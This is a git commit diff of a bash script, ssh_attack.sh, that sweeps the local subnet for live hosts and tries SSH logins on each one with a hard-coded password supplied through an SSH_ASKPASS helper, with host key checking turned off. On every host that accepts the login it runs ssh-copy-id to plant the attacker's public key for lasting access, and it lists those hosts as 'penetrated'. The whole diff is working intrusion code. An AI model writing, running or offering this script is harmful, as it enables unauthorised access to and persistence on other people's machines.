422a2fa63d8f622db7c15ef5f514e444f84c894c
de-souza <43355143+de-souza@users.noreply.github.com>
2019-10-30 17:00:29 +0100

    Add public SSH key to unsecure hosts on network

--- Unix/ssh_attack.sh
+++ Unix/ssh_attack.sh
@@ -1,17 +1,51 @@
 #!/usr/bin/env bash
-# Print the IP adresses that are reachable on the same network
-filename="iplist.txt"
+# Print the IP adresses that are reachable and unsecure on the network
+password='password'
 timeout=3
 
-[[ $(ip --brief addr) =~ UP\ *([^\/]*) ]] && ip=${BASH_REMATCH[1]} || exit 1
+# Create temporary files
+reachable=$(mktemp)
+getpassword=$(mktemp)
+unsecure=$(mktemp)
+penetrated=$(mktemp)
 
-echo "This computer's IP address: $ip"
+# Get your IP address
+[[ $(ip --brief addr) =~ UP\ *([^\/]*) ]] && my_ip=${BASH_REMATCH[1]} || exit 1
+echo "This computer's IP address: $my_ip"
 
-rm -f "$filename"
-for i in $(seq -f "${ip%\.*}.%g" 1 254); do
-    (ping "$i" -c 1 -w "$timeout" >/dev/null && echo "$i" >> "$filename" &)
+# Get reachable IP addresses
+echo "Reachable IP addresses on the network:"
+for ip in $(seq -f "${my_ip%\.*}.%g" 1 254); do
+    (ping "$ip" -c 1 -w "$timeout" >/dev/null && echo "$ip" >> "$reachable" &)
 done
 sleep "$timeout"
+cat "$reachable"
 
-echo "IPs reachable on the network:"
-cat "$filename"
+# Prepare a program to use SSH without entering the password
+echo 'echo "ajc"' >> "$getpassword"
+chmod +x "$getpassword"
+export SSH_ASKPASS="$getpassword" DISPLAY=
+
+# Try to connect to reachable IP addrsses
+echo "Unsecure IP addresses on the network:"
+while read ip; do
+    (setsid ssh \
+        -o StrictHostKeyChecking=no \
+        -o UserKnownHostsFile=/dev/null \
+        -o NumberOfPasswordPrompts=1 \
+        -o ConnectTimeout="$timeout" \
+        -q "$ip" exit && echo "$ip" >> "$unsecure" &)
+done < "$reachable"
+sleep "$timeout"
+cat "$unsecure"
+
+# Add your public key to unsecure hosts
+echo "Penetrated hosts on the network:"
+while read ip; do
+    (setsid ssh-copy-id "$ip" >/dev/null 2>&1 && echo "$ip" >> "$penetrated" &)
+done < "$unsecure"
+sleep "$timeout"
+cat "$penetrated"
+
+# Remove temporary files
+rm "$reachable" "$getpassword" "$unsecure" "$penetrated"
